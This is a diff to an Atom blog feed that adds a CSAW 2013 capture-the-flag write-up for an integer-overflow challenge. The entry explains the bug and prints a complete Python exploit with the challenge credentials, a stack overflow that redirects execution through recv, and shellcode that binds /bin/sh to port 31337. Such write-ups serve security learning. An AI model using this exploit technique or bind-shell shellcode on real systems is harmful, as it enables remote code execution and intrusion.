@@ -1,10 +1,10 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
 
-  <title><![CDATA[jmp esp]]></title>
+  <title><![CDATA[ejohn]]></title>
   <link href="http://ejohn.github.io/atom.xml" rel="self"/>
   <link href="http://ejohn.github.io/"/>
-  <updated>2013-09-23T15:51:31-04:00</updated>
+  <updated>2013-09-23T17:59:44-04:00</updated>
   <id>http://ejohn.github.io/</id>
   <author>
     <name><![CDATA[ejohn]]></name>
@@ -12,5 +12,126 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[CSAW 2013: Exploitation 300]]></title>
+    <link href="http://ejohn.github.io/blog/2013/09/23/csaw-exploitation-300/"/>
+    <updated>2013-09-23T16:34:00-04:00</updated>
+    <id>http://ejohn.github.io/blog/2013/09/23/csaw-exploitation-300</id>
+    <content type="html"><![CDATA[<p>The level 300 exploitation challenge involved an integer overflow. I figured out the username and password that were hardcoded in the binary. The program then asks for an integer input and uses that as the number of bytes to read parameter in recv(). The only input validation that is performed on this parameter is to check if it is less than 1024. Classic integer overflow vulnerability! Entering <code>-1</code> here lets us enter as much data we need since it gets interpreted as a positive integer. The next thing to notice is that the stack is executable.</p>
+
+<h3>The plan of action</h3>
+
+<ul>
+<li>Find the address of recv function in PLT using <code>objdump -d fil_chal | grep recv</code></li>
+<li>Find a writable location in the data or bss section of the binary using <code>readelf -S fil_chal</code></li>
+<li>Exploit the integer overflow vulnerability and overflow the stack by sending sufficient padding.</li>
+<li>Overflow EIP with the address of the recv function. Setup the stack in such a way that <code>recv(4, addr_in_bss, len(shellcode), 0)</code> is called and after recv returns, execution continues at <code>addr_in_bss</code>. I figured the socket descriptor is 4 using strace and checking the recv call made by the binary.</li>
+<li>Once the shellcode is read into memory at the address specified, execution jumps to the shellcode and we have a shell listening at port 31337.</li>
+</ul>
+
+
+<h3>Exploit</h3>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">pack</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">tn</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">(</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">34266</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">tn</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;UserName: &#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">tn</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&#39;csaw2013&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">tn</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;Password: &#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">tn</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&#39;S1mplePWD&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">tn</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;Entry Info: &#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">tn</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;-1&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="c">##Shellcode to bind /bin/sh on port 31337</span>
+</span><span class='line'><span class="c">##http://www.shell-storm.org/shellcode/files/shellcode-847.php</span>
+</span><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="s">&quot;</span><span class="se">\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51</span><span class="s">&quot;</span>
+</span><span class='line'>          <span class="s">&quot;</span><span class="se">\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0</span><span class="s">&quot;</span>
+</span><span class='line'>          <span class="s">&quot;</span><span class="se">\x66\xb3\x02\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a</span><span class="s">&quot;</span>
+</span><span class='line'>          <span class="s">&quot;</span><span class="se">\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x01</span><span class="s">&quot;</span>
+</span><span class='line'>          <span class="s">&quot;</span><span class="se">\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89</span><span class="s">&quot;</span>
+</span><span class='line'>          <span class="s">&quot;</span><span class="se">\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f</span><span class="s">&quot;</span>
+</span><span class='line'>          <span class="s">&quot;</span><span class="se">\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68</span><span class="s">&quot;</span>
+</span><span class='line'>          <span class="s">&quot;</span><span class="se">\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2</span><span class="s">&quot;</span>
+</span><span class='line'>          <span class="s">&quot;</span><span class="se">\xb0\x0b\xcd\x80</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">padding</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">1056</span>
+</span><span class='line'><span class="n">recv</span> <span class="o">=</span> <span class="mh">0x08048890</span>
+</span><span class='line'><span class="n">bss</span> <span class="o">=</span> <span class="mh">0x0804b008</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="mi">32</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="c">##recv(socket_descriptor, addr_in_bss, num_bytes_to_read, flags)</span>
+</span><span class='line'><span class="c">##return address after recv = addr_in_bss</span>
+</span><span class='line'><span class="n">tn</span><span class="o">.</span><span class="n">write</span><span class="p">(</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">recv</span><span class="p">)</span> <span class="o">+</span>
+</span><span class='line'>                  <span class="n">pack</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="o">+</span>
+</span><span class='line'>                  <span class="n">pack</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span>
+</span><span class='line'>                  <span class="n">pack</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="o">+</span>
+</span><span class='line'>                  <span class="n">pack</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span>
+</span><span class='line'>                  <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span><span class='line'><span class="n">tn</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">tn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
   
 </feed>
